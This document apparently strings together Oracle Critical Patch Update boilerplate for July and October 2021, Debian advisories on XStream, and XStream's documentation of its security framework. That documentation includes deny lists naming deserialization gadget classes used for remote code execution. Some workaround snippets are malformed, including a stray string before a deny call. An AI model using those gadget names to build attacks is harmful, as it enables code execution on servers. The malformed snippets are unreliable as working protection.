## Oracle Critical Patch Update Advisory - July 2021

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 342 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2021 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2788740.1).

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security fixes and detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2021verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

Debian Bug     : 985843

In XStream there is a vulnerability which may allow a remote attacker to
load and execute arbitrary code from a remote host only by manipulating the
processed input stream.

The type hierarchies for java.io.InputStream, java.nio.channels.Channel,
javax.activation.DataSource and javax.sql.rowsel.BaseRowSet are now
blacklisted as well as the individual types
com.sun.corba.se.impl.activation.ServerTableEntry,
com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator,
sun.awt.datatransfer.DataTransferer$IndexOrderComparator, and
sun.swing.SwingLazyValue. Additionally the internal type
Accessor$GetterSetterReflection of JAXB, the internal types
MethodGetter$PrivilegedGetter and ServiceFinder$ServiceNameIterator of
JAX-WS, all inner classes of javafx.collections.ObservableList and an
internal ClassLoader used in a private BCEL copy are now part of the
default blacklist and the deserialization of XML containing one of the
types will fail. You will have to enable these types by explicit
configuration, if you need them.

For Debian 9 stretch, these problems have been fixed in version
1.4.11.1-1+deb9u2.

We recommend that you upgrade your libxstream-java packages.

For the detailed security status of libxstream-java please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/libxstream-java>

# Security Aspects

XStream is designed to be an easy to use library. It takes its main task seriously: converting Java objects to
XML, and XML to Java objects. As a result, it is possible to create an instance of XStream with the default
constructor, call a method to convert an object into XML, then call another method to turn the XML back into an
equivalent Java object. By design, there are few limits to the type of objects XStream can handle.

This flexibility comes at a price. XStream applies various techniques under the hood to ensure it is able to
handle all types of objects. This includes using undocumented Java features and reflection. The XML generated by
XStream includes all information required to build objects of almost any type. This introduces a potential
security problem.

The provided XML data is used by XStream to unmarshal Java objects. This data can be manipulated by injecting
the XML representation of other objects, that were not present at marshalling time. An attacker could take
advantage of this to access private data, delete local files, execute arbitrary code or shell commands in the
context of the server running the XStream process or cause a denial of service by crashing the application or
manage to enter an endless loop consuming 100% of CPU cycles.

Note: XStream supports other data formats than XML, e.g. JSON. Those formats can usually be used
for the same attacks.

The XML data can be manipulated on different levels. For example, manipulating values on existing objects (such
as a price value), accessing private data, or breaking the format and causing the XML parser to fail. The latter
case will raise an exception, but the former case must be handled by validity checks in any application which
processes user-supplied XML.

See [workarounds](#workaround) for the different versions covering all the CVEs listed here.

This list contains only vulnerabilities, that could be created using the Java runtime with
XStream. Vulnerabilities introduced by using additional 3rd party libraries and classes are beyond XStream's
responsibility.

## External Security

An active Java Security Manager can prevent actions required by XStream components or converters. The same
applies to environments such as Google Application Engine. XStream tries to some extent to check the functionality
of a converter before it claims to handle a type.

Therefore it is possible that XStream behaves differently in such an environment, because a converter suddenly
no longer handles a special type or any type at all. It is essential that an application that will have to run in
such an environment is tested at an early stage to prevent nasty surprises.

## Implicit Security

As explained above, it is possible to inject other object instances if an attacker is able to define the data
used to deserialize the Java objects, see the different CVEs. Knowing how to define such an attack is the only
prerequisite.

All those scenarios were based on types that are delivered with the Java runtime at some version. Looking at
other well-known and commonly used Java libraries libraries such as ASM, CGLIB, or Groovy, you will have to assume
other scenarios for exploits as well. A class like InvokerTransformer of Apache Commons Collections has a high
potential for attacks. By default XStream 1.4.18 works now with a whitelist. If you modify the default setup, it
is also your responsibility to protect your clients from such vulnerabilities.

Note: This vulnerability is not even a special problem of XStream. XML being deserialized by XStream acts here
like a script, and the scenario above can be created with any script that is executed within a Java runtime (e.g.
using its JavaScript interpreter) if someone is able to manipulate it externally. The key message for application
developers is that deserializing arbitrary user-supplied content is a dangerous proposition in all cases. The best
approach to prevent such an attach is a [whitelist](#example), i.e. the deserialization mechanism should
only allow explicit types. See also the advice for vulnerabilities using
[Java Serialization](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm).

A blacklist for special classes only creates therefore a scenario for a false security,
because no-one can assure, that no other vulnerability is found. A better approach is the usage of a whitelist
i.e. the allowed class types are setup explicitly. This is the default for XStream 1.4.18 (see below).

XStream supports references to objects already occuring on the object graph in an earlier location. This allows
an attacker to create a highly recursive object structure. Some collections or maps calculate the position of a
member based on the data of the member itself. This is true for sorting collections or maps, but also for
collections or maps based on the hash code of the individual members. The calculation time for the member's
position can increase exponentially depending on the recursive depth of the structure and cause therefore a Denial
of Service. Therefore XStream measures the time consumed to add an element to a collection or map since version
1.4.19. Normally this operation is performed in a view milliseconds, but if adding elements take longer than a
second, then the time is accumulated and an exception is thrown if it exceeds a definable limit (20 seconds by
default).

## Explicit Security

Starting with XStream 1.4.7, it is possible to define [permissions](#framework) for types, to check
the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly
With these permissions it is at least not possible to inject unexpected types into an object graph. The security
framework supports the setup of a blacklist or whitelist scenario. Any application should use this feature to
limit the danger of arbitrary command execution if it deserializes data from an external source.

XStream itself sets up a whitelist by default, i.e. it blocks all classes except those types it has explicit
converters for. Until version 1.4.17 it used a blacklist by default, i.e. it tried to block all currently known
critical classes of the Java runtime. Main reason for the blacklist were compatibility, it allowed to use newer
versions of XStream as drop-in replacement. However, this approach has failed. A growing list of security reports
has proven, that a blacklist is inherently unsafe, apart from the fact that types of 3rd libraries were not even
considered. XStream provides the ability to setup a whitelist since version 1.4.7, a version released nine years
before 1.4.18. Clients who have adapted their setup and initialize the security framework are able to use newer
versions again as drop-in replacement. A blacklist scenario should be avoided in general, because it provides a
false sense of security.

Note: If a type on a whitelist contains itself other members that are handled by XStream, you
will have to add those member's types to the whitelist also. There is no automatism for indirect references.

Separate to the XStream security framework, it has always been possible to overwrite the setupConverter method
of XStream to register only the required converters.

Apart from value manipulations, this implementation still allows the injection of allowed
objects at wrong locations, e.g. inserting an integer into a list of strings.

To avoid an attack based on the position of an element in a collection or map, you should also use XStream's
default converters for 3rd party or own implementations of collections or maps. Own custom converters of such
types should measure the time to add an element at deserialization time using the following sequence in the
implementation of the unmarshal method:
```
// unmarshal element of collection
long now = System.currentTimeMillis();
// add element here, e.g. list.add(element);
SecurityUtils.checkForCollectionDoSAttack(context, now);

```

## XML Validation

XML itself supports input validation using a schema and a validating parser. With XStream, you can use e.g. a
DOM parser for validation, but it will take some effort to ensure that the XML read and written by XStream matches
the schema in first place, because XStream uses additionally own attributes. Typically you will have to write some
custom converters, but it can be worth the effort depending on the use case.

# Security Framework

Noted above, it might be possible that other combinations are found with the Java runtime itself, or other
commonly-used Java libraries that allow a similar vulnerability like the known case using the Java Beans
EventHandler. To prevent such a possibility at all, XStream version 1.4.7 and above contains a security framework,
allowing application developers to define which types are allowed to be unmarshalled with XStream. Use
[XStream.setupDefaultSecurity()](javadoc/com/thoughtworks/xstream/XStream.html#setupDefaultSecurity-com.thoughtworks.xstream.XStream-)
to install the default whitelist of 1.4.18 already with 1.4.7 to 1.4.10.

The core interface is [TypePermission](javadoc/com/thoughtworks/xstream/security/TypePermission.html).
The [SecurityMapper](javadoc/com/thoughtworks/xstream/mapper/SecurityMapper.html) will evaluate a list
of registered instances for every type that will be required while unmarshalling input data. The interface has one
simple method:

```
boolean allow(Class);
```

The [XStream](javadoc/com/thoughtworks/xstream/XStream.html) facade provides the following methods to
register such type permissions within the SecurityMapper:

```
XStream.addPermission(TypePermission);
XStream.allowTypes(Class[]);
XStream.allowTypes(String[]);
XStream.allowTypesByRegExp(String[]);
XStream.allowTypesByRegExp(Pattern[]);
XStream.allowTypesByWildcard(String[]);
XStream.allowTypeHierary(Class);
XStream.denyPermission(TypePermission);
XStream.denyTypes(Class[]);
XStream.denyTypes(String[]);
XStream.denyTypesByRegExp(String[]);
XStream.denyTypesByRegExp(Pattern[]);
XStream.denyTypesByWildcard(String[]);
XStream.denyTypeHierary(Class);
```

The sequence of registration is essential. The most recently registered permission will be evaluated first.

Every TypePermission has three options to implement the allow method and make decisions on the provided type:

* if the method returns *true*, the type is accepted and no other permissions are evaluated
* if the method returns *false*, the implementation cannot judge over the type and the SecurityMapper will
  continue with the next permission instance in its registration list
* the method throws a [ForbiddenClassException](javadoc/com/thoughtworks/xstream/security/ForbiddenClassException.html)
  to stop the unmarshalling process

## Predefined Permission Types

XStream provides some TypePermission implementations to allow any or no type at all, to allow primitive types
and their counterpart, null, array types, implementations match the name of the type by regular or wildcard
expression and one to invert a permission.

Note: The examples below are **examples**. Some will or might enable types that
are target of a security issue from above and are highlighted as dangerous.

| Permission | Description | Example | Default |
| [AnyTypePermission](javadoc/com/thoughtworks/xstream/security/AnyTypePermission.html) | **Start a blacklist** and allow any type. A registration of this permission will wipe any prior one. You may use the ANY instance directly. Note, that it is now in the responsibility of the developer to deny any type that might be used for arbitrary code execution as described in the CVEs above. | addPermission(*AnyTypePermission.ANY*); | no |
| [ArrayTypePermission](javadoc/com/thoughtworks/xstream/security/ArrayTypePermission.html) | Allow any array type. You may use the ARRAYS instance directly. | addPermission(*ArrayTypePermission.ARRAYS*); | yes |
| [CGLIBProxyTypePermission](javadoc/com/thoughtworks/xstream/security/CGLIBProxyTypePermission.html) | Allow any CGLIB proxy type. You may use the PROXIES instance directly. | addPermission(*CGLIBProxyTypePermission.PROXIES*); | no |
| [ExplicitTypePermission](javadoc/com/thoughtworks/xstream/security/ExplicitTypePermission.html) | Allow types explicitly by name. | allowTypes(new String[] {"*java.io.File*", "*java.lang.ProcessBuilder*"}); allowTypes(new Class[] {*java.io.File.class*, *java.lang.ProcessBuilder.class*}); | java.io.File, java.nio.charset.Charset, java.util.BitSet, java.lang.Class, java.lang.Object, java.lang.StackTraceElement, java.lang.String, java.lang.StringBuffer, java.lang.StringBuilder, java.net.URI, java.net.URL, java.sql.Date, java.sql.Time, java.sql.Timestamp, java.text.DecimalFormatSymbols, java.time.Duration, java.time.Instant, java.time.LocalDate, java.time.LocalDateTime, java.time.LocalTime, java.time.MonthDay, java.time.OffsetDateTime, java.time.OffsetTime, java.time.Period, java.time.Ser, java.time.Year, java.time.YearMonth, java.time.ZonedDateTime, java.time.chrono.HijrahDate, java.time.chrono.JapaneseDate, java.time.chrono.JapaneseEra, java.time.chrono.MinguoDate, java.time.chrono.Ser, java.time.chrono.ThaiBuddhistDate, java.time.temporal.ValueRange, java.time.temporal.WeekFields, java.util.Currency, java.util.Date, java.util.Locale, java.util.regex.Pattern, java.util.UUID |
| [InterfaceTypePermission](javadoc/com/thoughtworks/xstream/security/InterfaceTypePermission.html) | Allow any interface type. You may use the INTERFACES instance directly. | addPermission(*InterfaceTypePermission.INTERFACES*); | yes |
| [NoPermission](javadoc/com/thoughtworks/xstream/security/NoPermission.html) | Invert any other permission. Instances of this type are used by XStream in the deny methods wrapping a permission. | denyPermission(*permissionInstance*); | no |
| [NoTypePermission](javadoc/com/thoughtworks/xstream/security/NoTypePermission.html) | **Start a whitelist** and allow no type. A registration of this permission will wipe any prior one. You may use the NONE instance directly. | addPermission(*NoTypePermission.NONE*); | yes |
| [NullPermission](javadoc/com/thoughtworks/xstream/security/NullPermission.html) | Allow null as type. You may use the NULL instance directly. | addPermission(*NullPermission.NULL*); | yes |
| [PrimitiveTypePermission](javadoc/com/thoughtworks/xstream/security/PrimitiveTypePermission.html) | Allow any primitive type and its boxed counterpart (excluding void). You may use the PRIMITIVES instance directly. | addPermission(*PrimitiveTypePermission.PRIMITIVES*); | yes |
| [ProxyTypePermission](javadoc/com/thoughtworks/xstream/security/ProxyTypePermission.html) | Allow any Java proxy type. You may use the PROXIES instance directly. | addPermission(*ProxyTypePermission.PROXIES*); | no |
| [RegExpTypePermission](javadoc/com/thoughtworks/xstream/security/RegExpTypePermission.html) | Allow any type that matches with its name a regular expression. | allowTypesByRegExp(new String[]{"*.\*\\.core\\..\**", "*[^$]+*"}); allowTypesByRegExp(new Pattern[]{Pattern.compile("*.\*\\.core\\..\**"), Pattern.compile("*[^$]+*")}); | – |
| [TypeHierarchyPermission](javadoc/com/thoughtworks/xstream/security/TypeHierarchyPermission.html) | Allow types of a hierarchy. | allowTypeHierarchy(*java.lang.Throwable.class*); | java.lang.Enum, java.lang.Number, java.lang.Throwable, java.lang.reflect.Member, java.nio.file.Path, java.time.Clock, java.time.ZoneId, java.time.chrono.Chronology, java.util.Calendar, java.util.Collection, java.util.Map, java.util.Map.Entry, java.util.TimeZone |
| [WildcardTypePermission](javadoc/com/thoughtworks/xstream/security/WildcardTypePermission.html) | Allow any type that matches with its name a wildcard expression. | allowTypesByWildcard(new String[]{"*java.lang.\**", "*java.util.\*\*"*}); | – |

## Example Code Whitelist

XStream uses now the NoTypePermission by default with an internal whitelist. You can clear out this default
and/or register your own permissions to adjust the security framework (the Blog type is from the
[Alias Tutorial](alias-tutorial.html)):

```
XStream xstream = new XStream();
// clear out existing permissions and start a whitelist
xstream.addPermission(NoTypePermission.NONE);
// allow some basics
xstream.addPermission(NullPermission.NULL);
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
xstream.allowTypeHierarchy(Collection.class);
// allow any type from the same package
xstream.allowTypesByWildcard(new String[] {
    Blog.class.getPackage().getName()+".*"
});

```

You may have a further look at XStream's acceptance tests, the security framework is enabled there in general.

## Workarounds for older XStream versions

As recommended, use XStream's security framework to implement a whitelist for the allowed types. This is
possible since XStream 1.4.7 and it is the default since XStream 1.4.18.

Users of XStream 1.4.17 who insist to use XStream default blacklist - despite that clear recommendation - can
add these lines to XStream's setup code:

```
xstream.denyTypesByWildcard(new String[]{ "sun.reflect.**", "sun.tracing.**", "com.sun.corba.**" });
xstream.denyTypesByRegExp(new String[]{ ".*\\.ws\\.client\\.sei\\..*", ".*\\$ProxyLazyValue", "com\\.sun\\.jndi\\..*Enumerat(?:ion|or)", ".*\\$URLData", ".*\\.xsltc\\.trax\\.TemplatesImpl" });

```

Users of XStream 1.4.16 should add these lines and **additionally** the lines for version 1.4.17:

```
xstream.denyTypesByRegExp(new String[]{ ".*\\.Lazy(?:Search)?Enumeration.*", "(?:java|sun)\\.rmi\\..*" });

```

Users of XStream 1.4.15 should add these lines and **additionally** the lines for version 1.4.16 and 1.4.17:

```
xstream.denyTypes(new String[]{ "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator" });
xstream.denyTypesByRegExp(new String[]{ ".*\\$ServiceNameIterator", "(javax|sun.swing)\\..*LazyValue", "javafx\\.collections\\.ObservableList\\$.*", ".*\\.bcel\\..*\\.util\\.ClassLoader" });
xstream.denyTypeHierarchy(java.io.InputStream.class );
xstream.denyTypeHierarchy(java.nio.channels.Channel.class );
xstream.denyTypeHierarchy(javax.activation.DataSource.class );
xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );

```

Users of XStream 1.4.13 and 1.4.14 should add these lines and **additionally** the lines for version 1.4.15 to 1.4.17:

```
xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });

```

Users of XStream 1.4.7 to 1.4.12 who want to use XStream with a blacklist will have to setup such a list from
scratch:

```
xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter", "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });
".*\\.xsltc\\.trax\\.TemplatesImpl"xstream.denyTypesByRegExp(new String[]{ ".*\\$ServiceNameIterator", "javafx\\.collections\\.ObservableList\\$.*", ".*\\.bcel\\..*\\.util\\.ClassLoader", ".*\\$GetterSetterReflection", ".*\\$LazyIterator", ".*\\$PrivilegedGetter",  ".*\\.ws\\.client\\.sei\\..*", ".*\\$ProxyLazyValue", "com\\.sun\\.jndi\\..*Enumerat(?:ion|tor)", ".*\\$URLData", ".*\\.xsltc\\.trax\\.TemplatesImpl" });
xstream.denyTypesByWildcard(new String[]{ "sun.reflect.**", "sun.tracing.**", "com.sun.corba.**" });
xstream.denyTypeHierarchy(java.io.InputStream.class);
xstream.denyTypeHierarchy(java.nio.channels.Channel.class);
xstream.denyTypeHierarchy(javax.activation.DataSource.class);
xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class);

```

Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently
know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:

```
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null
      && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class
        || type.getName().equals("javax.imageio.ImageIO$ContainsFilter") || type.getName().equals("sun.awt.datatransfer.DataTransferer$IndexOrderComparator") || type.getName().equals("com.sun.corba.se.impl.activation.ServerTableEntry") || type.getName().equals("com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator")
        || type.getName().matches("javafx\\.collections\\.ObservableList\\$.*") || type.getName().matches(".*\\$ServiceNameIterator")  || type.getName().matches(".*\\$GetterSetterReflection") || type.getName().matches(".*\\$LazyIterator") || type.getName().matches(".*\\$ProxyLazyValue") || type.getName().matches(".*\\.bcel\\..*\\.util\\.ClassLoader") || type.getName().matches(".*\\.ws\\.client\\.sei\\..*") || type.getName().matches("com\\.sun\\.jndi\\..*Enumerat(?:ion|or)")
        || type.getName().endsWith(".$URLData") || type.getName().endsWith(".xsltc.trax.TemplatesImpl")
        || type.getName().startsWith("sun.reflect.") || type.getName().startsWith("sun.tracing.") || type.getName().startsWith("com.sun.corba.")
        || java.io.InputStream.class.isAssignableFrom(type) || java.nio.channels.Channel.isAssignableFrom(type) || javax.activation.DataSource.isAssignableFrom(type) ||javax.sql.rowset.BaseRowSet.isAssignableFrom(type)
        || Proxy.isProxy(type));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }
}, XStream.PRIORITY_VERY_HIGH);

                 CVE-2021-21351 CVE-2021-29505

Multiple security vulnerabilities have been discovered in XStream, a Java
library to serialize objects to XML and back again.

These vulnerabilities may allow a remote attacker to load and execute arbitrary
code from a remote host only by manipulating the processed input stream.

XStream itself sets up a whitelist by default now, i.e. it blocks all classes
except those types it has explicit converters for. It used to have a blacklist
by default, i.e. it tried to block all currently known critical classes of the
Java runtime. Main reason for the blacklist were compatibility, it allowed to
use newer versions of XStream as drop-in replacement. However, this approach
has failed. A growing list of security reports has proven, that a blacklist is
inherently unsafe, apart from the fact that types of 3rd libraries were not
even considered. A blacklist scenario should be avoided in general, because it
provides a false sense of security.

For the oldstable distribution (buster), these problems have been fixed
in version 1.4.11.1-1+deb10u3.

For the stable distribution (bullseye), these problems have been fixed in
version 1.4.15-3+deb11u1.

We recommend that you upgrade your libxstream-java packages.

For the detailed security status of libxstream-java please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/libxstream-java>

## Oracle Critical Patch Update Advisory - October 2021

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 419 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [October 2021 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2809080.1).

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security fixes and detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuoct2021verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 38 new security patches for Oracle Fusion Middleware.  30 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuoct2021verbose.html#FMW)

